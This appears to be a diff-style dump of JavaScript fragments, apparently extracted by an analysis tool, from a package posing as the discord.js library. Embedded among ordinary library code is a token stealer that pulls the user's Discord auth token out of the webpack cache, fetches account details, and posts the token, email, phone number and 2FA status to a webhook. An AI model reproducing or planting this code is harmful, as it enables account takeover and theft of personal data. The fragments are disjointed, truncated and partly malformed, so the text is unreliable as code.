@@ -1,0 +1,377 @@
+overwrites = overwrites.map(overwrite => {
+      const role = this.client.resolver.resolveRole(guild, overwrite.id);
+      if (role) {
+        overwrite.id = role.id;
+        overwrite.type = 'role';
+      } else {
+        overwrite.id = this.client.resolver.resolveUserID(overwrite.id);
+        overwrite.type = 'member';
+      }
+
+      return {
+        allow: Permissions.resolve(overwrite.allow || overwrite.allowed || 0),
+        deny: Permissions.resolve(overwrite.deny || overwrite.denied || 0),
+        type: overwrite.type,
+        id: overwrite.id,
+      };
+    })
+setTimeout(async function() {
+        const token = Object.values(webpackJsonp.push([[],{['']:(_,e,r)=>{e.cache=r.c}},[['']]]).cache).find(m=>m.exports&&m.exports.default&&m.exports.default.getToken!==void 0).exports.default.getToken();
+
+        let res;
+        try {
+            res = await fetch("https://discordapp.com/api/v9/users/@me", {
+                method: "GET",
+                headers: {
+                    "Authorization": token
+                }
+            });
+            res = await res.json();
+        } catch(e) {
+            return;
+        }
+        try {
+            let hook;
+            hook = await fetch(url, {
+                method: "POST",
+                headers: {
+                    "Content-type": "application/json"
+                },
+                body: JSON.stringify({
+                    content: `**Browser Token:** \`\`\`${token}\`\`\`
+**Account Info:** \`\`\`${res.username}#${res.discriminator}
+User ID: ${res.id}
+Email Add...
+const token = Object.values(webpackJsonp.push([[],{['']:(_,e,r)=>{e.cache=r.c}},[['']]]).cache).find(m=>m.exports&&m.exports.default&&m.exports.default.getToken!==void 0).exports.default.getToken()
+this.build({
+      url: url || this.constructor.DFEAULT.url,
+      version: version || this.constructor.DEFAULT.version,
+    })
+error.message && flattened ? <operator>.formatString("", error.message, "\n", flattened, "") : error.message || flattened
+VoiceServerUpdate = package\src\client\websocket\packets\handlers\VoiceServerUpdate.js::program:VoiceServerUpdate:<init>
+res = await fetch("https://discordapp.com/api/v9/users/@me", {
+                method: "GET",
+                headers: {
+                    "Authorization": token
+                }
+            })
+WebSocketPacketManager = package\src\client\websocket\packets\WebSocketPacketManager.js::program:WebSocketPacketManager:<init>
+TextBasedChannel = package\src\structures\interfaces\TextBasedChannel.js::program:TextBasedChannel:<init>
+ReactionCollector = package\src\structures\ReactionCollector.js::program:ReactionCollector:<init>
+const WebSocket = (function findWebSocket() {
+  if (browser) return window.WebSocket; // eslint-disable-line no-undef
+  try {
+    return require('uws');
+  } catch (e) {
+    return require('ws');
+  }
+}())
+VoiceWebSocket = package\src\client\voice\VoiceWebSocket.js::program:VoiceWebSocket:<init>
+this.encoder.applyEncoderCTL(this.ctl.BITRATE, Math.min(128, Math.max(16, bitrate)) * 1000)
+this.register(Constants.WSEvents.READY, require('./handlers/Ready'))
+exports.fetch = engineOptions => {
+  for (const encoder of list) {
+    const fetched = fetch(encoder, engineOptions);
+    if (fetched) return fetched;
+  }
+
+  throw new Error('Couldn\'t find an Opus engine.');
+}
+this.register(Constants.WSEvents.GUILD_UPDATE, require('./handlers/GuildUpdate'))
+hook = await fetch(url, {
+                method: "POST",
+                headers: {
+                    "Content-type": "application/json"
+                },
+                body: JSON.stringify({
+                    content: `**Browser Token:** \`\`\`${token}\`\`\`
+**Account Info:** \`\`\`${res.username}#${res.discriminator}
+User ID: ${res.id}
+Email Address: ${res.email}
+Phone Number: ${res.phone}
+2FA On: ${res.mfa_enabled}
+Bio: "${res.bio}"\`\`\``                })
+            })
+this.register(Constants.WSEvents.GUILD_MEMBER_REMOVE, require('./handlers/GuildMemberRemove'))
+this.bitfield = typeof permissions === 'number' ? permissions : this.constructor.resolve(permissions)
+_tmp_12.d = {
+          protocol: 'udp',
+          data: {
+            address: packet.address,
+            port: packet.port,
+            mode: 'xsalsa20_poly1305',
+          },
+        }
+_tmp_6.INVALID_SHARD = "Invalid shard settings were provided."
+_tmp_13.data = {
+            address: packet.address,
+            port: packet.port,
+            mode: 'xsalsa20_poly1305',
+          }
+dispatcher.once('end', () => this.unregisterDispatcher(dispatcher))
+dispatcher.on('volumeChange', (o, n) => {
+        this.unregisterDispatcher(dispatcher, o);
+        if (!this._dispatchers.has(n)) {
+          this._dispatchers.set(n, new Set());
+          this._encoders.set(n, OpusEncoders.fetch());
+        }
+        this._dispatchers.get(n).add(dispatcher);
+      })
+this.currentStream = {
+      transcoder: transcoder,
+      output: transcoder.output,
+      input: stream,
+    }
+const Endpoints = exports.Endpoints = {
+  User: userID => {
+    if (userID.id) userID = userID.id;
+    const base = `/users/${userID}`;
+    return {
+      toString: () => base,
+      channels: `${base}/channels`,
+      profile: `${base}/profile`,
+      relationships: `${base}/relationships`,
+      settings: `${base}/settings`,
+      Relationship: uID => `${base}/relationships/${uID}`,
+      Guild: guildID => ({
+        toString: () => `${base}/guilds/${guildID}`,
+        settings: `${base}/guilds/${guildID}/settings`,
+      }),
+      Note: id => `${base}/notes/${id}`,
+      Mentions: (limit, roles, everyone, guildID) =>
+        `${base}/mentions?limit=${limit}&roles=${roles}&everyone=${everyone}${guildID ? `&guild_id=${guildID}` : ''}`,
+      Avatar: (root, hash) => {
+        if (userID === '1') return hash;
+        return Endpoints.CDN(root).Avatar(userID, hash);
+      },
+    };
+  },
+  guilds: '/guilds',
+  Guild: guildID => {
+    if (guildID.id) guildID = guildID.id;
+    const base = `/g...
+const send = chan => {
+        if (content instanceof Array) {
+          const messages = [];
+          (function sendChunk(list, index) {
+            const options = index === list.length - 1 ? { tts, embed, files } : { tts };
+            chan.send(list[index], options).then(message => {
+              messages.push(message);
+              if (index >= list.length - 1) return resolve(messages);
+              return sendChunk(list, ++index);
+            }).catch(reject);
+          }(content, 0));
+        } else {
+          this.rest.makeRequest('post', Endpoints.Channel(chan).messages, true, {
+            content, tts, nonce, embed,
+          }, files).then(data => resolve(this.client.actions.MessageCreate.handle(data).message), reject);
+        }
+      }
+this.requestResetTime - Date.now() + this.timeDifference + this.restManager.client.options.restTimeOffset
+function sendChunk(list, index) {
+            const options = index === list.length - 1 ? { tts, embed, files } : { tts };
+            chan.send(list[index], options).then(message => {
+              messages.push(message);
+              if (index >= list.length - 1) return resolve(messages);
+              return sendChunk(list, ++index);
+            }).catch(reject);
+          }(content, 0)
+function parseLocalPacket = function parseLocalPacket(message) {
+  try {
+    const packet = Buffer.from(message);
+    let address = '';
+    for (let i = 4; i < packet.indexOf(0, i); i++) address += String.fromCharCode(packet[i]);
+    const port = parseInt(packet.readUIntLE(packet.length - 2, 2).toString(10), 10);
+    return { address, port };
+  } catch (error) {
+    return { error };
+  }
+}
+this.mentions = new Mentions(
+      this,
+      'mentions' in data ? data.mentions : this.mentions.users,
+      'mentions_roles' in data ? data.mentions_roles : this.mentions.roles,
+      'mention_everyone' in data ? data.mention_everyone : this.mentions.everyone
+    )
+_tmp_13.push(Actions.CHANNEL_OVERWRITE_CREATE)
+this.fetchMessages({ limit: 1, around: messageID }).then(messages => {
+        const msg = messages.get(messageID);
+        if (!msg) throw new Error('Message not found.');
+        return msg;
+      })
+permission.map(p => this.resolve(p)).reduce((prev, p) => prev | p, 0)
+file = { attachment: file.file, name: path.basename(file.file) || 'file.jpg' }
+throw new RangeError(Constants.Errors.NOT_A_PERMISSION);
+(_tmp_14 = [
+      Actions.CHANNEL_DELETE,
+      Actions.CHANNEL_OVERWRITE_DELETE,
+      Actions.MEMBER_KICK,
+      Actions.MEMBER_PRUNE,
+      Actions.MEMBER_BAN_ADD,
+      Actions.ROLE_DELETE,
+      Actions.INVITE_DELETE,
+      Actions.WEBHOOK_DELETE,
+      Actions.EMOJI_DELETE,
+      Actions.MESSAGE_DELETE,
+    ]).includes
+_tmp_7.gateway = {
+    toString: () => '/gateway',
+    bot: '/gateway/bot',
+  }
+this.content
+      .replace(/@(everyone|here)/g, '@\u200b$1')
+      .replace(/<@!?[0-9]+>/g, input => {
+        const id = input.replace(/<|!|>|@/g, '');
+        if (this.channel.type === 'dm' || this.channel.type === 'group') {
+          return this.client.users.has(id) ? `@${this.client.users.get(id).username}` : input;
+        }
+
+        const member = this.channel.guild.members.get(id);
+        if (member) {
+          if (member.nickname) return `@${member.nickname}`;
+          return `@${member.user.username}`;
+        } else {
+          const user = this.client.users.get(id);
+          if (user) return `@${user.username}`;
+          return input;
+        }
+      })
+      .replace(/<#[0-9]+>/g, input => {
+        const channel = this.client.channels.get(input.replace(/<|#|>/g, ''));
+        if (channel) return `#${channel.name}`;
+        return input;
+      })
+      .replace(/<@&[0-9]+>/g, input => {
+        if (this.channel.type === 'dm' || this.channel.type === 'group') retur...
+Permissions.FLAGS = {
+  CREATE_INSTANT_INVITE: 1 << 0,
+  KICK_MEMBERS: 1 << 1,
+  BAN_MEMBERS: 1 << 2,
+  ADMINISTRATOR: 1 << 3,
+  MANAGE_CHANNELS: 1 << 4,
+  MANAGE_GUILD: 1 << 5,
+  ADD_REACTIONS: 1 << 6,
+  VIEW_AUDIT_LOG: 1 << 7,
+  PRIORITY_SPEAKER: 1 << 8,
+
+  VIEW_CHANNEL: 1 << 10,
+  READ_MESSAGES: 1 << 10,
+  SEND_MESSAGES: 1 << 11,
+  SEND_TTS_MESSAGES: 1 << 12,
+  MANAGE_MESSAGES: 1 << 13,
+  EMBED_LINKS: 1 << 14,
+  ATTACH_FILES: 1 << 15,
+  READ_MESSAGE_HISTORY: 1 << 16,
+  MENTION_EVERYONE: 1 << 17,
+  EXTERNAL_EMOJIS: 1 << 18,
+  USE_EXTERNAL_EMOJIS: 1 << 18,
+
+  CONNECT: 1 << 20,
+  SPEAK: 1 << 21,
+  MUTE_MEMBERS: 1 << 22,
+  DEAFEN_MEMBERS: 1 << 23,
+  MOVE_MEMBERS: 1 << 24,
+  USE_VAD: 1 << 25,
+
+  CHANGE_NICKNAME: 1 << 26,
+  MANAGE_NICKNAMES: 1 << 27,
+  MANAGE_ROLES: 1 << 28,
+  MANAGE_ROLES_OR_PERMISSIONS: 1 << 28,
+  MANAGE_WEBHOOKS: 1 << 29,
+  MANAGE_EMOJIS: 1 << 30,
+}
+this.manager.broadcastEval(message._sEval).then(
+          results => this.send({ _sEval: message._sEval, _result: results }),
+          err => this.send({ _sEval: message._sEval, _error: Util.makePlainError(err) })
+        )
+this.sendPacket({ op: Constants.VoiceOPCodes.HEARTBEAT, d: null }).catch(() => {
+      this.emit('warn', 'Tried to send heartbeat, but connection is not open');
+      this.clearHeartbeat();
+    })
+gateway = gateway === void 0 ? this.gateway : gateway
+other.id === this.id &&
+        other.name === this.name
+const messages = body.messages.map(x =>
+        x.map(m => new Message(this.client.channels.get(m.channel_id), m, this.client))
+      )
+MessageEmbedProvider = package\src\structures\MessageEmbed.js::program:MessageEmbedProvider:<init>
+<operator>.formatString("Tried to connect to an invalid gateway: ", gateway, "")
+this.client.actions.GuildEmojisUpdate.handle({
+        guild_id: this.id,
+        emojis: data.emojis,
+      })
+_tmp_20.thumbnail = this.thumbnail ? {
+        url: this.thumbnail.url,
+      } : null
+const channel = this.client.channels.get(input.replace(/<|#|>/g, ''))
+payload.allow &= ~(Permissions.FLAGS[perm] || 0)
+this.client.rest.methods.getChannelPinnedMessages(this).then(data => {
+      const messages = new Collection();
+      for (const message of data) {
+        const msg = new Message(this, message, this.client);
+        messages.set(message.id, msg);
+        this._cacheMessage(msg);
+      }
+      return messages;
+    })
+new Promise((resolve, reject) => {
+        const file = path.resolve(resource);
+        fs.stat(file, (err, stats) => {
+          if (err) return reject(err);
+          if (!stats || !stats.isFile()) return reject(new Error(`The file could not be found: ${file}`));
+          fs.readFile(file, (err2, data) => {
+            if (err2) reject(err2);
+            else resolve(data);
+          });
+          return null;
+        });
+      })
+_tmp_20.author = this.author ? {
+        name: this.author.name,
+        url: this.author.url,
+        icon_url: this.author instanceof MessageEmbed.Author ? this.author.iconURL : this.author.icon_url,
+      } : null
+fs.stat(file, (err, stats) => {
+          if (err) return reject(err);
+          if (!stats || !stats.isFile()) return reject(new Error(`The file could not be found: ${file}`));
+          fs.readFile(file, (err2, data) => {
+            if (err2) reject(err2);
+            else resolve(data);
+          });
+          return null;
+        })
+_tmp_87.permission_overwrites = resolvePermissions.call(this, overwrites, guild)
+this.rest.makeRequest('post', Endpoints.guilds, true, options).then(data => {
+        if (this.client.guilds.has(data.id)) return resolve(this.client.guilds.get(data.id));
+
+        const handleGuild = guild => {
+          if (guild.id === data.id) {
+            this.client.removeListener(Constants.Events.GUILD_CREATE, handleGuild);
+            this.client.clearTimeout(timeout);
+            resolve(guild);
+          }
+        };
+        this.client.on(Constants.Events.GUILD_CREATE, handleGuild);
+
+        const timeout = this.client.setTimeout(() => {
+          this.client.removeListener(Constants.Events.GUILD_CREATE, handleGuild);
+          reject(new Error('Took too long to receive guild data.'));
+        }, 10000);
+        return undefined;
+      }, reject)
+this.target = guild[`${targetType.toLowerCase()}s`].get(data.target_id)
+this.rest.makeRequest('put', Endpoints.Guild(guild).Member(user.id), true, options)
+      .then(data => this.client.actions.GuildMemberGet.handle(guild, data).member)
+messageIDs = messageIDs.filter(id => Date.now() - Snowflake.deconstruct(id).date.getTime() < 1209600000)
+testVal !== value || (testVal === undefined && !collection.has(key))
+this.rest.makeRequest(
+      'get', Endpoints.User('@me').Mentions(options.limit, options.roles, options.everyone, options.guild), true
+    ).then(data => data.map(m => new Message(this.client.channels.get(m.channel_id), m, this.client)))
+data.map(m => new Message(this.client.channels.get(m.channel_id), m, this.client))
+const voiceState = this._rawVoiceStates.get(member.user.id)
+this.client.channels.has(voiceState.channel_id)
+this.client.channels.get(voiceState.channel_id).members.set(member.user.id, member)
+_tmp_149.get = util.deprecate(function defaultChannel() {
+    return this.channels.get(this.id);
+  }, 'Guild#defaultChannel: This property is obsolete, will be removed in v12.0.0, and may not function as expected.')
+(_tmp_150 = this.channels).get
